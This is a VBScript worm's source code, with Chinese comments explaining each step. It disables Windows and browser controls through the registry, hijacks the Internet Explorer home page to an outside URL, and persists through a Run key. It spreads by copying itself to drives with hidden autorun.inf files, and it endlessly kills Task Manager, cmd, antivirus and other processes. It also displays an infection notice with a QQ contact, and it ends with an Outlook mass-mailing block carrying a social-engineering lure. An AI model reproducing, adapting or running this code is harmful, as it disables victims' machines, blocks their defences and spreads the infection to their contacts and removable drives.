dim fso,wsh,myfile,ws,pp,fsoFolder 
set wsh=wscript.createobject("wscript.shell") 
set fso=wscript.createobject("scripting.filesystemobject") 
set myfile=fso.GetFile(wscript.scriptfullname)  
'修改注册表（开始菜单里面的东西和IE各项设置)
wsh.Regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue",0,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFileOpen",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Advanced",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\AutoConfig",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://ruanji03.ys168.com"
wsh.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://ruanji03.ys168.com"
wsh.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","http://ruanji03.ys168.com"
wsh.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Default_Search_URL","http://ruanji03.ys168.com"
wsh.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page","http://ruanji03.ys168.com"
wsh.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","http://ruanji03.ys168.com"
wsh.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Default_Search_URL","http://ruanji03.ys168.com"
wsh.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Search Page","http://ruanji03.ys168.com"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode",1,"REG_DWORD"
wsh.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Win32system","c:\NYboy.vbs" 
wsh.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry",""
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\StartMenuLogOff",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSMHelp",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetHood",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWinKeys",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecentDocsMenu",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind","1","REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFavoritesMenu",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecentDocsHistory",1,"REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","1","REG_DWORD"
wsh.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled",1,"REG_DWORD"
'使用户不能通过双击打开硬盘，这里还可以修改为使其不能通过双击打开文件夹，同理，不赘续
wsh.Regwrite "HKLM\SOFTWARE\Classes\Drive\shell\auto\command\","C:\NYboy.bat '%1'" 
wsh.Regwrite "HKCR\Drive\shell\","auto"
wsh.Regwrite "HKCR\Drive\shell\auto\command\","C:\NYboy.bat '%1'"
wsh.Regwrite "HKLM\SOFTWARE\Classes\Directory\shell\","auto"
wsh.Regwrite "HKCR\Directory\shell\auto\command\","C:\NYboy.bat '%1'"
wsh.Regwrite "HKLM\SOFTWARE\Classes\Directory\shell\auto\command\","C:\NYboy.bat '%1'"
'修改默认文件图标　这里可以换成可爱的熊猫哦
wsh.Regwrite "HKCR\exefile\DefaultIcon\","c:\1.ico" 
wsh.Regwrite "HKCR\txtfile\DefaultIcon\","c:\1.ico" 
wsh.Regwrite "HKCR\dllfile\DefaultIcon\","c:\1.ico" 
wsh.Regwrite "HKCR\batfile\DefaultIcon\","c:\1.ico" 
wsh.Regwrite "HKCR\inifile\DefaultIcon\","c:\1.ico" 
wsh.Regwrite "HKLM\SOFTWARE\Classes\exefile\DefaultIcon\","c:\1.ico" 
wsh.Regwrite "HKLM\SOFTWARE\Classes\txtfile\DefaultIcon\","c:\1.ico" 
wsh.Regwrite "HKLM\SOFTWARE\Classes\dllfile\DefaultIcon\","c:\1.ico" 
wsh.Regwrite "HKLM\SOFTWARE\Classes\batfile\DefaultIcon\","c:\1.ico" 
wsh.Regwrite "HKLM\SOFTWARE\Classes\inifile\DefaultIcon\","c:\1.ico" 
wsh.Regwrite "HKLM\Software\CLASSES\.reg\","txtfile"
wsh.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption","你好啊，大兵和你开个小小的玩笑"
wsh.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText","你已经中毒了，赶快杀毒或者与QQ252287438联系"
'复制自身到C,D,E,F,U盘
myfile.copy "c:\" 
myfile.copy "D:\" 
myfile.copy "E:\"
myfile.copy "F:\" 
myfile.copy "I:\" 
myfile.attributes=34 
'定义Autorun.inf 的内容　这个就是u盘病毒必须的代码部分　这里可以简单写
If fso.FileExists("C:\autorun.inf") Then 
Set objFolder = fso.GetFile("C:\autorun.inf") 
Else 
wsh.run "cmd /c echo [AutoRun]>>C:\autorun.inf"_  
&"&& echo open=NYboy.bat >>C:\autorun.inf"_  
&"&& echo shellexecute=NYboy.bat >>C:\autorun.inf"_  
&"&& echo shell\Auto\command=NYboy.bat>>C:\autorun.inf"_  
&"&& echo shell=Auto>>C:\autorun.inf"_ 
&"&& attrib +h +s +r C:\autorun.inf" 
set autobatc=fso.createtextfile("c:\NYboy.bat",1,ture)
autobatc.writeline("NYboy.vbs")
End If
If fso.FileExists("D:\autorun.inf") Then 
Set objFolder = fso.GetFile("D:\autorun.inf") 
Else 
wsh.run "cmd /c echo [AutoRun]>>D:\autorun.inf"_  
&"&& echo open=NYboy.bat >>D:\autorun.inf"_  
&"&& echo shellexecute=NYboy.bat >>D:\autorun.inf"_  
&"&& echo shell\Auto\command=NYboy.bat>>D:\autorun.inf"_  
&"&& echo shell=Auto>>D:\autorun.inf"_ 
&"&& attrib +h +s +r D:\autorun.inf" 
set autobatd=fso.createtextfile("D:\NYboy.bat",1,ture)
autobatd.writeline("NYboy.vbs")
End If
If fso.FileExists("E:\autorun.inf") Then 
Set objFolder = fso.GetFile("E:\autorun.inf") 
Else 
wsh.run "cmd /c echo [AutoRun]>>E:\autorun.inf"_  
&"&& echo open=NYboy.bat >>E:\autorun.inf"_  
&"&& echo shellexecute=NYboy.bat >>E:\autorun.inf"_  
&"&& echo shell\Auto\command=NYboy.bat>>E:\autorun.inf"_  
&"&& echo shell=Auto>>E:\autorun.inf"_ 
&"&& attrib +h +s +r E:\autorun.inf" 
set autobate=fso.createtextfile("E:\NYboy.bat",1,ture)
autobate.writeline("NYboy.vbs")
End If
If fso.FileExists("F:\autorun.inf") Then 
Set objFolder = fso.GetFile("F:\autorun.inf") 
Else 
wsh.run "cmd /c echo [AutoRun]>>F:\autorun.inf"_  
&"&& echo open=NYboy.bat >>F:\autorun.inf"_  
&"&& echo shellexecute=NYboy.bat >>F:\autorun.inf"_  
&"&& echo shell\Auto\command=NYboy.bat>>F:\autorun.inf"_  
&"&& echo shell=Auto>>F:\autorun.inf"_ 
&"&& attrib +h +s +r F:\autorun.inf" 
set autobatf=fso.createtextfile("F:\NYboy.bat",1,ture)
autobatf.writeline("NYboy.vbs")
End If
If fso.FileExists("I:\autorun.inf") Then 
Set objFolder = fso.GetFile("I:\autorun.inf") 
Else 
wsh.run "cmd /c echo [AutoRun]>>I:\autorun.inf"_  
&"&& echo open=NYboy.bat >>I:\autorun.inf"_  
&"&& echo shellexecute=NYboy.bat >>I:\autorun.inf"_  
&"&& echo shell\Auto\command=NYboy.bat>>I:\autorun.inf"_  
&"&& echo shell=Auto>>I:\autorun.inf"_ 
&"&& attrib +h +s +r I:\autorun.inf" 
set autobatf=fso.createtextfile("I:\NYboy.bat",1,ture)
autobatf.writeline("NYboy.vbs")
End If
'设置病毒体属性为　系统　只读　隐藏
wsh.run "cmd /c attrib +h +s +r C:\NYboy.bat"_  
&"&& attrib +h +s +r D:\NYboy.bat"_  
&"&& attrib +h +s +r E:\NYboy.bat"_  
&"&& attrib +h +s +r F:\NYboy.bat"_  
&"&& attrib +h +s +r I:\NYboy.bat"
'强制结束某些进程,比如QQ，记事本，网页，批处理文件，卡巴，realplay等进程,运行后打不开这些文件
do 
set ws=getobject("winmgmts:\\.\root\cimv2") 
set pp=ws.execquery("select * from win32_process where name='taskmgr.exe'or Name = 'QQ.exe'or Name = 'notepad.exe'or Name = 'IEXPLORE.exe'or Name = 'cmd.exe'or Name = 'avp.exe'or Name = 'winRAR.exe'or Name = 'realplay.exe'or Name = 'WINWORD.exe'") 
for each i in pp 
i.terminate()
wscript.sleep 100 
next 
loop
'使病毒可以靠邮件传播
Set ol=CreateObject("Outlook.Application")
On Error Resume Next
For x=1 To 5
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="今晚你来吗？"
Mail.Body="朋友你好：您的朋友给您发来了热情的邀请。具体情况请阅读随信附件，祝您好运！               QQ交友频道"
Mail.Attachments.Add("c:\NYboy.vbs")
Mail.Send
Next
ol.Quit
